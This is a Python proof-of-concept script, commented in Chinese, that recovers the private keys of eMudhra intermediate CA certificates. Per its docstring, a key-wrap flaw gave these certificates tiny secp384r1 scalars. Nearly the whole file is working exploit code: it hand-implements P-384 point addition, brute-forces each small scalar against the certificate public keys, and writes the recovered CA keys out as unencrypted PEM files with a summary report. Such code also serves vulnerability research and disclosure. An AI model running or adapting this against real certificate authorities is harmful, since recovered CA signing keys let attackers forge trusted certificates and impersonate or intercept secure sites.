#!/usr/bin/env python3
"""
eMudhra 中间 CA (secp384r1) 弱私钥恢复 —— PoC

背景：2025-04-30 KGC 中 key wrap/unwrap 缺陷导致发布了第二套"弱"密钥，
私钥标量 d 极小（< 256）。ECDSA 公钥 Q = d*G，因此只要对 d 做小整数
穷举、与证书 SPKI 比对，即可确定性恢复私钥。

做法：从 impacted-intermediates.json 取 16 张证书（8 个唯一公钥 ×
      两个签发者），按 SPKI 分组，增量点加暴力搜索 d，直到全部命中。
输出：recovered/keys.json、recovered/*.key.pem (PKCS#8)、recovered/report.md
"""
import json
import pathlib
import sys
import time

from cryptography import x509
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec

ROOT = pathlib.Path(__file__).resolve().parent.parent
FX = ROOT / "fixtures" / "impacted-intermediates.json"
OUT = ROOT / "recovered"

# --- secp384r1 (NIST P-384) 域参数 ---------------------------------------
P = 2**384 - 2**128 - 2**96 + 2**32 - 1
A = -3 % P
B = 0xB3312FA7E23EE7E4988E056BE3F82D19181D9C6EFE8141120314088F5013875AC656398D8A2ED19D2A85C8EDD3EC2AEF
GX = 0xAA87CA22BE8B05378EB1C71EF320AD746E1D3B628BA79B9859F741E082542A385502F25DBF55296C3A545E3872760AB7
GY = 0x3617DE4A96262C6F5D9E98BF9292DC29F8F41DBD289A147CE9DA3113B5F0B8C00A60B1CE1D7E819D7A431D7C90EA0E5F
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973


def add(p1, p2):
    """仿射坐标点加（含倍点与无穷远点）。"""
    if p1 is None:
        return p2
    if p2 is None:
        return p1
    x1, y1 = p1
    x2, y2 = p2
    if x1 == x2 and (y1 + y2) % P == 0:
        return None
    if p1 == p2:
        lam = (3 * x1 * x1 + A) * pow(2 * y1, -1, P) % P
    else:
        lam = (y2 - y1) * pow(x2 - x1, -1, P) % P
    x3 = (lam * lam - x1 - x2) % P
    y3 = (lam * (x1 - x3) - y1) % P
    return (x3, y3)


def brute_d(targets, max_d=1 << 16):
    """增量 d*G 搜索。targets: {x: [...]}。返回 {x: d}。"""
    found = {}
    pt = None  # 0 * G = O
    g = (GX, GY)
    t0 = time.perf_counter()
    for d in range(1, max_d + 1):
        pt = add(pt, g)
        if pt is None:
            continue
        if pt[0] in targets and pt[0] not in found:
            found[pt[0]] = d
            if len(found) == len(targets):
                break
    return found, time.perf_counter() - t0


def slugify(name: str) -> str:
    """"EM OV TLS CA - G3C" -> "EM-OV-TLS-CA-G3C"。"""
    return name.replace(" - ", "-").replace(" ", "-")


def main():
    entries = json.loads(FX.read_text(encoding="utf-8"))
    OUT.mkdir(parents=True, exist_ok=True)

    # 按 SPKI 分组：同一公钥被两个 CA 交叉签名
    groups = {}
    for e in entries:
        cert = x509.load_pem_x509_certificate(e["pem"].encode())
        pub = cert.public_key()
        nums = pub.public_numbers()
        assert isinstance(pub.curve, ec.SECP384R1), pub.curve
        g = groups.setdefault(
            e["spki_sha256"],
            {"name": e["name"], "subject": e["subject"], "x": nums.x, "y": nums.y,
             "issued_by": [], "serials": []},
        )
        g["issued_by"].append(f'{e["issued_by"]} ({e["issuer_operator"]})')
        g["serials"].append(f'{e["serial_hex"]} / {e["issuer_operator"]}')

    print(f"[*] {len(entries)} 张证书 → {len(groups)} 个唯一公钥")
    targets = {g["x"]: spki for spki, g in groups.items()}
    found, elapsed = brute_d(targets)

    print(f"[*] 穷举耗时 {elapsed*1000:.1f} ms, 命中 {len(found)}/{len(groups)}")

    missing = set(groups) - {targets[x] for x in found}
    if missing:
        print(f"[!] 未命中: {missing}", file=sys.stderr)

    report = []
    out_keys = {}
    for spki, g in groups.items():
        d = found.get(g["x"])
        if d is None:
            continue
        # 1) 从 d 重建私钥并比对公钥
        sk = ec.derive_private_key(d, ec.SECP384R1())
        pn = sk.public_key().public_numbers()
        match = (pn.x == g["x"] and pn.y == g["y"])

        pem = sk.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        ).decode()

        slug = slugify(g["name"]) + "-" + g["issued_by"][0].replace(" ", "")
        fn = OUT / f"{slug}.key.pem"
        fn.write_text(pem, encoding="utf-8")

        out_keys[spki] = {
            "name": g["name"],
            "subject": g["subject"],
            "d": d,
            "d_hex": hex(d),
            "curve": "secp384r1",
            "spki_sha256": spki,
            "pubkey_match": match,
            "issued_by": g["issued_by"],
            "serials": g["serials"],
            "key_file": str(fn.relative_to(ROOT)),
        }
        report.append((g["name"], g["issued_by"][0], d, match))
        print(f"  [+] {g['name']:<20} d = {d:<4} (0x{d:02x})  pubkey_match={match}")

    (OUT / "keys.json").write_text(
        json.dumps(out_keys, indent=2, ensure_ascii=False), encoding="utf-8"
    )

    # 报告
    lines = [
        "# eMudhra 中间 CA 弱私钥恢复报告",
        "",
        "曲线 secp384r1 (P-384)，穷举区间 d ∈ [1, 65536]，判定条件 Q = d·G 与证书 SPKI 完全一致。",
        f"穷举耗时 {elapsed*1000:.1f} ms。",
        "",
        "| 证书 | 签发者 | 私钥 d (十进制) | d (hex) | 有效强度 | 公钥匹配 |",
        "| --- | --- | --- | --- | --- | --- |",
    ]
    for name, issuer, d, match in report:
        lines.append(
            f"| {name} | {issuer} | {d} | 0x{d:02x} | {max(1, d.bit_length())} bit | {'✔' if match else '✘'} |"
        )
    (OUT / "report.md").write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"[*] 写出 {OUT/'keys.json'} 与 {OUT/'report.md'}")
    return 0 if not missing else 1


if __name__ == "__main__":
    raise SystemExit(main())
